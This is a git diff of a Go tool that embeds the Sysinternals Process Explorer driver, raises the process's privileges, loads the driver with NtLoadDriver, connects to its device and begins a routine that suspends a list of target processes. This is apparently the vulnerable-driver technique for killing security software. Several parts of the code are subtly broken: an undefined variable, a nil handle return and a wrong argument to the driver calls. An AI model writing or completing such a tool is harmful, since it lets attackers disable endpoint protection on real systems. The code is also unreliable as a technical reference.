@@ -7,6 +7,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"syscall"
 
 	"github.com/fourcorelabs/wintoken"
 	"golang.org/x/sys/windows"
@@ -19,9 +20,62 @@ var content_processes string
 //go:embed Resources/PROCEXP.sys
 var driver []byte
 
-func adjust_privilege() error {
-	// thanks to https://github.com/blackhat-go/bhg/blob/7d3318a7a60b7bedc876f8f328ec8e1cbe64c5bc/ch-12/procInjector/winsys/token.go#L55
+func suspend_processes(handle windows.HANDLE, targets []string) error {
+	windows.DeviceIoControl(handle, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)
 
+	return nil
+}
+
+func connect_procexp_device() (windows.HANDLE, error) {
+	var handle windows.HANDLE
+	var volume_name = fmt.Sprintf("\\\\.\\PROCEXP152")
+	handle, err := windows.CreateFile(windows.StringToUTF16Ptr(volume_name), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)
+	if err != nil {
+		return nil, errors.New("[-] Error while creating volume for procexp")
+	}
+
+	return handle, nil
+}
+
+func unload_driver(drivername string) error {
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	proc := ntdll.NewProc("NtUnloadDriver")
+
+	registry := "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" + drivername
+
+	namep, err := windows.UTF16PtrFromString(registry)
+	if err != nil {
+		return errors.New("[-] Error while converting name to unicode")
+	}
+
+	_, _, err = proc.Call(uintptr(*namep))
+
+	// TODO: handle the driver errors ?
+	fmt.Println("[INFO] Driver unloading result is:", err)
+
+	return nil
+}
+
+func load_driver(drivername string) error {
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	proc := ntdll.NewProc("NtLoadDriver")
+
+	registry := "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" + drivername
+
+	namep, err := windows.UTF16PtrFromString(registry)
+	if err != nil {
+		return errors.New("[-] Error while converting name to unicode")
+	}
+
+	_, _, err = proc.Call(uintptr(*namep))
+
+	// TODO: handle the driver errors ?
+	fmt.Println("[INFO] Driver loading result is:", err)
+
+	return nil
+}
+
+func adjust_privilege() error {
 	current_pid := windows.Getpid()
 
 	token, err := wintoken.OpenProcessToken(current_pid, wintoken.TokenPrimary)
@@ -142,9 +196,6 @@ func check(e error) {
 
 func main() {
 	const DRIVERNAME string = "ProcExp64"
-	//var SE_DEBUG_NAME = [17]uint16{83, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0}
-
-	//fmt.Println("Run this tool as SYSTEM for maximum effect")
 
 	if is_elevated() {
 		fmt.Println("[+] Running with elevated rights, getting ready..")
@@ -168,8 +219,18 @@ func main() {
 	defer remove_registry_keys(DRIVERNAME, driverpath)
 
 	err = adjust_privilege()
+	check(err)
+	fmt.Println("[+] Successfully enabled all privileges for the current process")
 
-	//fmt.Println(SE_DEBUG_NAME)
 	process_list := load_process_names(content_processes)
 	fmt.Println(process_list)
+
+	err = load_driver(DRIVERNAME)
+	check(err)
+	fmt.Println("[+] Successfully loaded PROCEXP driver")
+	defer unload_driver(DRIVERNAME)
+
+	handle, err := connect_procexp_device()
+	check(err)
+	fmt.Println("[+] Successfully connected to PROCEXP driver")
 }
